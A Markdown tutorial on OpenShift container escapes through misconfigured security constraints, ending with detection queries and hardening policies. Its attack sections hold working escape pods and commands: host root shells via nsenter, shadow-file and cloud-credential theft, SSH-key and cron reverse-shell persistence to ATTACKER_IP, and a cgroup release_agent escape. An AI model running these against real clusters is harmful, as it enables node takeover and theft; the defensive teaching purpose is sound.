
# 🚨 Escaping Container Isolation in OpenShift via SCC Misconfigurations

> **⚠️ Disclaimer:** This document is for **educational and defensive security purposes only**. Understanding container escape techniques helps you harden your OpenShift clusters. Never use these techniques on systems you don't own.

---

## 📋 Table of Contents

- [What is Container Isolation?](#what-is-container-isolation)
- [How OpenShift Enforces Isolation](#how-openshift-enforces-isolation)
- [SCC Misconfigurations That Enable Escapes](#scc-misconfigurations-that-enable-escapes)
- [Escape Method 1: Privileged Container → Host Access](#escape-method-1-privileged-container--host-access)
- [Escape Method 2: hostPID + nsenter](#escape-method-2-hostpid--nsenter)
- [Escape Method 3: hostNetwork Namespace Escape](#escape-method-3-hostnetwork-namespace-escape)
- [Escape Method 4: Host Path Volume Mount](#escape-method-4-host-path-volume-mount)
- [Escape Method 5: Docker Socket Mount](#escape-method-5-docker-socket-mount)
- [Escape Method 6: Kernel Exploits via CAP_SYS_ADMIN](#escape-method-6-kernel-exploits-via-cap_sys_admin)
- [Escape Method 7: Writable sysfs / procfs](#escape-method-7-writable-sysfs--procfs)
- [Escape Method 8: Node Escalation via CRI-O Socket](#escape-method-8-node-escalation-via-cri-o-socket)
- [Detection & Auditing](#detection--auditing)
- [Hardening & Prevention](#hardening--prevention)
- [Quick Reference: SCC Fields That Break Isolation](#quick-reference-scc-fields-that-break-isolation)

---

## What is Container Isolation?

Container isolation is the set of Linux kernel mechanisms that keep a container's processes, filesystem, and network **separated** from the host and other containers:

| Mechanism | Purpose |
|:--|:--|
| **Namespaces** | Isolate PID, network, mount, UTS, IPC, user |
| **Cgroups** | Limit CPU, memory, I/O resources |
| **SELinux / AppArmor** | Mandatory access control policies |
| **Seccomp** | Restrict available system calls |
| **Capabilities** | Fine-grained root privilege control |

> When an SCC is misconfigured, one or more of these layers is **removed**, allowing a container to "escape" into the host.

---

## How OpenShift Enforces Isolation

```
┌──────────────────────────────────────────────┐
│              OpenShift Cluster                │
│                                              │
│  ┌──────────────────────────────────────┐    │
│  │     Security Context Constraints     │    │
│  │                                      │    │
│  │  ┌─────────┐  ┌─────────────────┐   │    │
│  │  │ SELinux  │  │  Capabilities   │   │    │
│  │  └─────────┘  └─────────────────┘   │    │
│  │  ┌─────────┐  ┌─────────────────┐   │    │
│  │  │ Seccomp │  │   Namespaces    │   │    │
│  │  └─────────┘  └─────────────────┘   │    │
│  │  ┌─────────┐  ┌─────────────────┐   │    │
│  │  │ RunAs   │  │    Volumes      │   │    │
│  │  └─────────┘  └─────────────────┘   │    │
│  └──────────────────────────────────────┘    │
│                                              │
│  ┌────────────┐  ┌────────────┐              │
│  │ Container A │  │ Container B │             │
│  │ (isolated)  │  │ (isolated)  │             │
│  └────────────┘  └────────────┘              │
└──────────────────────────────────────────────┘
```

The `restricted` SCC enforces:

- Random non-root UID
- No host namespaces (PID, network, IPC)
- No host volumes
- No privileged mode
- Drops all capabilities
- SELinux enforced
- Seccomp profile applied

---

## SCC Misconfigurations That Enable Escapes

| SCC Field | Dangerous Value | What It Breaks |
|:--|:--|:--|
| `allowPrivilegedContainer` | `true` | Disables ALL isolation |
| `allowHostPID` | `true` | Shares host PID namespace |
| `allowHostNetwork` | `true` | Shares host network stack |
| `allowHostIPC` | `true` | Shares host IPC namespace |
| `allowHostDirVolumePlugin` | `true` | Mounts host filesystem |
| `allowedCapabilities` | `[SYS_ADMIN]` | Near-root kernel access |
| `allowedCapabilities` | `[SYS_PTRACE]` | Can trace/debug host processes |
| `runAsUser.type` | `RunAsAny` | Allows UID 0 (root) |
| `seLinuxContext.type` | `RunAsAny` | Disables SELinux enforcement |
| `volumes` | `[hostPath, *]` | Allows host filesystem mounts |

---

## Escape Method 1: Privileged Container → Host Access

> 🔴 **Severity: CRITICAL** — A privileged container has **zero isolation** from the host.

### What happens

When `allowPrivilegedContainer: true`, the container:
- Sees all host devices (`/dev`)
- Can mount host filesystems
- Has all Linux capabilities
- Bypasses SELinux and seccomp
- Shares the host's cgroup namespace

### Setup (the misconfiguration)

```bash
oc create serviceaccount escape-sa -n test-ns
oc adm policy add-scc-to-user privileged -z escape-sa -n test-ns
```

### The escape

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-privileged
  namespace: test-ns
spec:
  serviceAccountName: escape-sa
  hostPID: true
  containers:
    - name: escape
      image: registry.access.redhat.com/ubi9/ubi:latest
      command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "/bin/bash"]
      securityContext:
        privileged: true
```

### What this does

```bash
# nsenter --target 1 enters PID 1's namespaces (the host's init process)
# You now have a root shell ON THE HOST NODE

# Verify — you'll see the host's filesystem
ls /
hostname
cat /etc/os-release

# You can now access ALL secrets, kubelet config, etc.
cat /etc/kubernetes/kubelet.conf
crictl ps
```

### Why it works

```
Container (privileged: true + hostPID: true)
    │
    ├── nsenter --target 1 (enters host PID 1 namespaces)
    │
    └── Result: Full root shell on the host node
```

---

## Escape Method 2: hostPID + nsenter

> 🔴 **Severity: CRITICAL** — Access to host PID namespace allows entering any process's namespace.

### The misconfiguration

```yaml
apiVersion: security.openshift.io/v1
kind: SecurityContextConstraints
metadata:
  name: bad-scc-hostpid
allowHostPID: true          # ← THIS IS THE PROBLEM
allowPrivilegedContainer: false
runAsUser:
  type: RunAsAny
seLinuxContext:
  type: RunAsAny
fsGroup:
  type: RunAsAny
supplementalGroups:
  type: RunAsAny
volumes:
  - '*'
users:
  - system:serviceaccount:test-ns:escape-sa
```

### The escape pod

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-hostpid
  namespace: test-ns
spec:
  serviceAccountName: escape-sa
  hostPID: true
  containers:
    - name: attacker
      image: registry.access.redhat.com/ubi9/ubi:latest
      command: ["sleep", "infinity"]
      securityContext:
        runAsUser: 0
```

### Exploitation

```bash
# Enter the pod
oc exec -it escape-hostpid -- bash

# List ALL host processes (not just container processes)
ps aux

# Find a host process (e.g., kubelet, PID might be ~1234)
ps aux | grep kubelet

# Enter the kubelet's namespace
nsenter --target <kubelet-pid> --mount --uts --ipc --net --pid -- /bin/sh

# You're now in the host's namespace context
cat /var/lib/kubelet/config.yaml
ls /etc/kubernetes/
```

---

## Escape Method 3: hostNetwork Namespace Escape

> 🟠 **Severity: HIGH** — Access to host network allows sniffing traffic, accessing node services, and reaching the metadata API.

### The misconfiguration

```yaml
allowHostNetwork: true      # ← DANGEROUS
allowHostPorts: true        # ← DANGEROUS
```

### The escape pod

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-hostnet
  namespace: test-ns
spec:
  serviceAccountName: escape-sa
  hostNetwork: true
  containers:
    - name: netsniff
      image: registry.access.redhat.com/ubi9/ubi:latest
      command: ["sleep", "infinity"]
      securityContext:
        runAsUser: 0
```

### Exploitation

```bash
oc exec -it escape-hostnet -- bash

# You're on the HOST network — see all host interfaces
ip addr show

# Access the cloud metadata API (AWS/GCP/Azure)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Sniff traffic on the host network (if tcpdump is available)
tcpdump -i eth0 -n

# Access node-local services (kubelet API)
curl -k https://localhost:10250/pods

# Scan internal cluster network
for i in $(seq 1 254); do
  curl -s --connect-timeout 1 http://10.128.0.$i:8080 && echo "10.128.0.$i:8080 is open"
done
```

---

## Escape Method 4: Host Path Volume Mount

> 🔴 **Severity: CRITICAL** — Mounting the host root filesystem gives full read/write access to the node.

### The misconfiguration

```yaml
allowHostDirVolumePlugin: true   # ← DANGEROUS
volumes:
  - hostPath                      # ← DANGEROUS
```

### The escape pod

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-hostpath
  namespace: test-ns
spec:
  serviceAccountName: escape-sa
  containers:
    - name: hostmount
      image: registry.access.redhat.com/ubi9/ubi:latest
      command: ["sleep", "infinity"]
      securityContext:
        runAsUser: 0
      volumeMounts:
        - name: host-root
          mountPath: /host
  volumes:
    - name: host-root
      hostPath:
        path: /
        type: Directory
```

### Exploitation

```bash
oc exec -it escape-hostpath -- bash

# Full host filesystem is at /host
ls /host/etc/
cat /host/etc/shadow
cat /host/etc/kubernetes/kubelet.conf

# Write an SSH key for persistent access
mkdir -p /host/root/.ssh
echo "ssh-rsa AAAA...your-key..." >> /host/root/.ssh/authorized_keys

# Add a cron job for persistence
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" >> /host/etc/crontab

# Chroot into the host
chroot /host /bin/bash
# You are now effectively ON the host
```

---

## Escape Method 5: Docker Socket Mount

> 🔴 **Severity: CRITICAL** — Access to the container runtime socket = full node control.

> **Note:** OpenShift uses CRI-O, not Docker. The equivalent is the CRI-O socket.

### The escape pod (Docker/Podman socket)

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-socket
  namespace: test-ns
spec:
  serviceAccountName: escape-sa
  containers:
    - name: docker-escape
      image: docker:latest
      command: ["sleep", "infinity"]
      securityContext:
        runAsUser: 0
      volumeMounts:
        - name: docker-sock
          mountPath: /var/run/docker.sock
  volumes:
    - name: docker-sock
      hostPath:
        path: /var/run/docker.sock
        type: Socket
```

### Exploitation

```bash
oc exec -it escape-socket -- sh

# List all containers on the node
docker ps

# Run a new privileged container with host access
docker run -it --privileged --pid=host --net=host \
  -v /:/hostfs alpine chroot /hostfs /bin/bash

# You now have a root shell on the host
```

---

## Escape Method 6: Kernel Exploits via CAP_SYS_ADMIN

> 🟠 **Severity: HIGH** — `SYS_ADMIN` is the most dangerous capability; it enables mount, cgroup, and namespace manipulation.

### The misconfiguration

```yaml
allowedCapabilities:
  - SYS_ADMIN       # ← EXTREMELY DANGEROUS
```

### The escape pod

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-sysadmin
  namespace: test-ns
spec:
  serviceAccountName: escape-sa
  containers:
    - name: sysadmin
      image: registry.access.redhat.com/ubi9/ubi:latest
      command: ["sleep", "infinity"]
      securityContext:
        runAsUser: 0
        capabilities:
          add: ["SYS_ADMIN"]
```

### Exploitation — cgroup escape (Notify on Release)

```bash
oc exec -it escape-sysadmin -- bash

# Mount a cgroup
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/escape

# Enable notify_on_release
echo 1 > /tmp/cgrp/escape/notify_on_release

# Get the container's overlay path on the host
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Set the release agent to execute a command on the host
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Create the payload
cat > /cmd <<EOF
#!/bin/bash
cat /etc/shadow > $host_path/shadow_dump
EOF
chmod +x /cmd

# Trigger the escape
echo $$ > /tmp/cgrp/escape/cgroup.procs

# Wait and check
sleep 2
cat /shadow_dump
```

---

## Escape Method 7: Writable sysfs / procfs

> 🟡 **Severity: MEDIUM-HIGH** — Writable `/proc` or `/sys` can modify kernel parameters.

### The escape pod

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-procfs
  namespace: test-ns
spec:
  serviceAccountName: escape-sa
  containers:
    - name: procfs
      image: registry.access.redhat.com/ubi9/ubi:latest
      command: ["sleep", "infinity"]
      securityContext:
        privileged: true
        runAsUser: 0
```

### Exploitation

```bash
oc exec -it escape-procfs -- bash

# Modify kernel parameters via /proc/sys
echo 1 > /proc/sys/net/ipv4/ip_forward

# Load a kernel module (if available)
modprobe <module_name>

# Access host core dumps
echo "|/tmp/exploit" > /proc/sys/kernel/core_pattern

# Read host kernel keys
cat /proc/keys
```

---

## Escape Method 8: Node Escalation via CRI-O Socket

> 🔴 **Severity: CRITICAL** — OpenShift uses CRI-O. Access to its socket = full node control.

### The escape pod

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-crio
  namespace: test-ns
spec:
  serviceAccountName: escape-sa
  containers:
    - name: crio-escape
      image: registry.access.redhat.com/ubi9/ubi:latest
      command: ["sleep", "infinity"]
      securityContext:
        runAsUser: 0
      volumeMounts:
        - name: crio-sock
          mountPath: /var/run/crio/crio.sock
  volumes:
    - name: crio-sock
      hostPath:
        path: /var/run/crio/crio.sock
        type: Socket
```

### Exploitation

```bash
oc exec -it escape-crio -- bash

# Use crictl to interact with the CRI-O runtime
# (install crictl or use curl against the socket)

# List all containers on the node
curl --unix-socket /var/run/crio/crio.sock http://localhost/containers/json

# Create a privileged container via the runtime
# This bypasses Kubernetes admission controls entirely
```

---

## Detection & Auditing

### Find pods using dangerous SCCs

```bash
# List all pods with their SCC annotations
oc get pods --all-namespaces -o json | \
  jq -r '.items[] | select(.metadata.annotations["openshift.io/scc"] != "restricted" and .metadata.annotations["openshift.io/scc"] != "restricted-v2") | [.metadata.namespace, .metadata.name, .metadata.annotations["openshift.io/scc"]] | @tsv' | \
  column -t
```

### Find privileged pods

```bash
oc get pods --all-namespaces -o json | \
  jq -r '.items[] | select(.spec.containers[].securityContext.privileged == true) | [.metadata.namespace, .metadata.name] | @tsv'
```

### Find pods with hostPID / hostNetwork / hostIPC

```bash
oc get pods --all-namespaces -o json | \
  jq -r '.items[] | select(.spec.hostPID == true or .spec.hostNetwork == true or .spec.hostIPC == true) | [.metadata.namespace, .metadata.name, "hostPID=\(.spec.hostPID)", "hostNet=\(.spec.hostNetwork)", "hostIPC=\(.spec.hostIPC)"] | @tsv'
```

### Find pods with hostPath volumes

```bash
oc get pods --all-namespaces -o json | \
  jq -r '.items[] | select(.spec.volumes[]?.hostPath != null) | [.metadata.namespace, .metadata.name, (.spec.volumes[] | select(.hostPath != null) | .hostPath.path)] | @tsv'
```

### Find ServiceAccounts with dangerous SCCs

```bash
for scc in privileged hostaccess hostnetwork anyuid; do
  echo "=== SCC: $scc ==="
  oc get scc $scc -o jsonpath='{.users}' 2>/dev/null | jq -r '.[]'
  echo ""
done
```

### Audit SCC configurations

```bash
# Export all SCCs for review
oc get scc -o yaml > all-sccs.yaml

# Check for custom SCCs with dangerous settings
oc get scc -o json | \
  jq -r '.items[] | select(.allowPrivilegedContainer == true or .allowHostPID == true or .allowHostNetwork == true) | [.metadata.name, "priv=\(.allowPrivilegedContainer)", "hostPID=\(.allowHostPID)", "hostNet=\(.allowHostNetwork)"] | @tsv' | \
  column -t
```

---

## Hardening & Prevention

### 1. Enforce `restricted-v2` as the default SCC

```bash
# Verify restricted-v2 is the default
oc describe scc restricted-v2
```

### 2. Remove unnecessary SCC grants

```bash
# Audit and remove
oc adm policy remove-scc-from-user privileged -z <sa> -n <ns>
oc adm policy remove-scc-from-user anyuid -z <sa> -n <ns>
oc adm policy remove-scc-from-user hostaccess -z <sa> -n <ns>
```

### 3. Use Pod Security Admission (PSA) labels

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: secure-namespace
  labels:
    # Enforce baseline or restricted pod security standards
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

### 4. Create minimal custom SCCs instead of using built-in dangerous ones

```yaml
apiVersion: security.openshift.io/v1
kind: SecurityContextConstraints
metadata:
  name: minimal-custom-scc
allowPrivilegedContainer: false
allowHostNetwork: false
allowHostPorts: false
allowHostPID: false
allowHostIPC: false
allowHostDirVolumePlugin: false
readOnlyRootFilesystem: true
requiredDropCapabilities:
  - ALL
allowedCapabilities: []
defaultAddCapabilities: []
runAsUser:
  type: MustRunAsRange
seLinuxContext:
  type: MustRunAs
fsGroup:
  type: MustRunAs
supplementalGroups:
  type: RunAsAny
seccompProfiles:
  - runtime/default
volumes:
  - configMap
  - downwardAPI
  - emptyDir
  - persistentVolumeClaim
  - projected
  - secret
```

### 5. Enable audit logging for SCC violations

```bash
# Check OpenShift audit logs for SCC-related events
oc adm node-logs --role=master --path=openshift-apiserver/audit.log | \
  grep -i "securitycontextconstraints"
```

### 6. Use OPA/Gatekeeper or Kyverno for policy enforcement

```yaml
# Example: Kyverno policy to block privileged containers
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: deny-privileged-containers
spec:
  validationFailureAction: Enforce
  rules:
    - name: deny-privileged
      match:
        any:
          - resources:
              kinds:
                - Pod
      validate:
        message: "Privileged containers are not allowed."
        pattern:
          spec:
            containers:
              - securityContext:
                  privileged: "!true"
```

---

## Quick Reference: SCC Fields That Break Isolation

| SCC Field | Safe Value | Dangerous Value | Escape Risk |
|:--|:--|:--|:--|
| `allowPrivilegedContainer` | `false` | `true` | 🔴 Full host access |
| `allowHostPID` | `false` | `true` | 🔴 Process namespace escape |
| `allowHostNetwork` | `false` | `true` | 🟠 Network sniffing, metadata API |
| `allowHostIPC` | `false` | `true` | 🟡 Shared memory attacks |
| `allowHostDirVolumePlugin` | `false` | `true` | 🔴 Host filesystem read/write |
| `allowedCapabilities` | `[]` | `[SYS_ADMIN]` | 🟠 Cgroup/mount escape |
| `allowedCapabilities` | `[]` | `[SYS_PTRACE]` | 🟡 Process debugging |
| `runAsUser.type` | `MustRunAsRange` | `RunAsAny` | 🟡 Root UID access |
| `seLinuxContext.type` | `MustRunAs` | `RunAsAny` | 🟠 Bypasses MAC |
| `readOnlyRootFilesystem` | `true` | `false` | 🟡 Writable container FS |
| `volumes` | `[limited list]` | `[*, hostPath]` | 🔴 Host mount access |

---

> 📌 **Key Takeaway:** Every SCC field that says `allowHost*: true` or `allowPrivileged*: true` is a potential container escape vector. Audit your SCCs regularly, enforce `restricted-v2` by default, and use policy engines (Kyverno/OPA Gatekeeper) as a second line of defense.
